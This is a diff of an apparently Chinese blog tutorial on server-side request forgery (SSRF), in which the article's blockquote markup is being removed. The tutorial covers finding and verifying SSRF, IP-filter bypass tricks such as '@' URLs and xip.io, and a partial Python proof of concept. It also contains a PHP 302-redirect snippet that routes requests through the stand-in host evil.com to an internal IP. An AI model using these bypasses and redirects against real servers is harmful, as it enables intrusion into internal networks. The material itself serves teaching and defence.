@@ -85,11 +85,12 @@
                     <div style="padding:5px 5px 2px 0px;">
                         <i class="fa fa-calendar fa-fw"></i>
                         <time>2016-06-30</time>
-                    </div>
+                        &nbsp;&nbsp;&nbsp;&nbsp;
+                    
 
                     
 
-                    <div style="padding:2px 5px 5px 0px;">
+                    
                         
                         
                         
@@ -116,21 +117,16 @@
 
 <h3 id="0x00-什么是ssrf">0x00 什么是SSRF</h3>
 
-<blockquote>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;SSRF(Server-Side Request Forgery:服务请求伪造)是一种由攻击者构造，从而让服务端发起请求的一种安全漏洞，<font color="FF0000">它将一个可以发起网络请求的服务当作跳板来攻击其他服务</font>，SSRF的攻击目标一般是<font color="FF0000">内网</font>。<br />
-&nbsp;&nbsp;&nbsp;&nbsp;当服务端提供了从其他服务器获取数据的功能(如:从指定URL地址获取网页文本内容、加载指定地址的图片、下载等)，但是没有对目标地址做过滤与限制时就会出现SSRF。</p>
-</blockquote>
+<p>SSRF(Server-Side Request Forgery:服务请求伪造)是一种由攻击者构造，从而让服务端发起请求的一种安全漏洞，<font color="FF0000">它将一个可以发起网络请求的服务当作跳板来攻击其他服务</font>，SSRF的攻击目标一般是<font color="FF0000">内网</font>。<br />
+当服务端提供了从其他服务器获取数据的功能(如:从指定URL地址获取网页文本内容、加载指定地址的图片、下载等)，但是没有对目标地址做过滤与限制时就会出现SSRF。</p>
 
 <h3 id="0x01-ssrf的危害">0x01 SSRF的危害</h3>
 
-<blockquote>
 <p>可以扫描内部网络<br />
 可以构造数据攻击内部主机</p>
-</blockquote>
 
 <h3 id="0x02-漏洞挖掘">0x02 漏洞挖掘</h3>
 
-<blockquote>
 <p>其实只要能对外发起网络请求就有可能存在SSRF漏洞。</p>
 
 <pre><code>1. 从WEB功能上寻找
@@ -144,22 +140,18 @@
     share、wap、url、link、src、source、target、u、3g、
     display、sourceURl、imageURL、domain...
 </code></pre>
-</blockquote>
 
 <h3 id="0x03-漏洞验证">0x03 漏洞验证</h3>
 
-<blockquote>
 <pre><code>http://www.aa.com/ss.php?image=http://www.baidu.com/img/bd_logo1.png
 1. 右键在新窗口打开图片，图片地址为http://www.baidu.com/img/bd_logo1.png，
     说明不存在SSRF漏洞。  
 2. firebug看网络连接信息，若没有http://www.baidu.com/img/bd_logo1.png
     这个图片请求，则证明图片是aa.com服务端发起的请求，则可能存在SSRF漏洞。
 </code></pre>
-</blockquote>
 
 <h3 id="0x04-绕过过滤">0x04 绕过过滤</h3>
 
-<blockquote>
 <p>有时漏洞利用时会遇到IP限制，可用如下方法绕过：</p>
 
 <pre><code>* 使用@：http://A.com@10.10.10.10 = 10.10.10.10
@@ -172,7 +164,6 @@
         foo.bar.10.0.0.1.xip.io = 10.0.0.1
 * 通过js跳转
 </code></pre>
-</blockquote>
 
 <h3 id="0x05-通用的ssrf实例">0x05 通用的SSRF实例</h3>
 
@@ -185,7 +176,6 @@
 
 <h3 id="0x06-附实例poc">0x06 附实例POC</h3>
 
-<blockquote>
 <pre><code class="language-python">#!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
@@ -225,7 +215,6 @@ for x in xrange(1,30):
     t = threading.Thread(target=get_title,args=(urllist,))
     t.start()
 </code></pre>
-</blockquote>
 
 <h3 id="0x07-防御">0x07 防御</h3>
 
@@ -245,7 +234,6 @@ for x in xrange(1,30):
 <li>302跳转</li>
 </ul>
 
-<blockquote>
 <pre><code class="language-php">//在自己服务器上建立文件，利用302跳转到对方内网地址。
 //http://target.com/httpProxyAccess.htm?go=http://evil.com/a.php?url=http://10.11.213.57
 //a.php内容如下：
@@ -254,18 +242,15 @@ for x in xrange(1,30):
     header(&quot;Location:&quot;.$url);
 ?&gt;
 </code></pre>
-</blockquote>
 
 <ul>
 <li>iframe</li>
 </ul>
 
-<blockquote>
 <pre><code class="language-php">//在自己服务器建立文件，利用iframe标签请求对方内网地址。
 //参考http://www.secpulse.com/archives/50034.html
 &lt;iframe src=&quot;对方内网地址&quot;&gt;
 </code></pre>
-</blockquote>
 
                 
                 <div style="padding:10px 1px;">
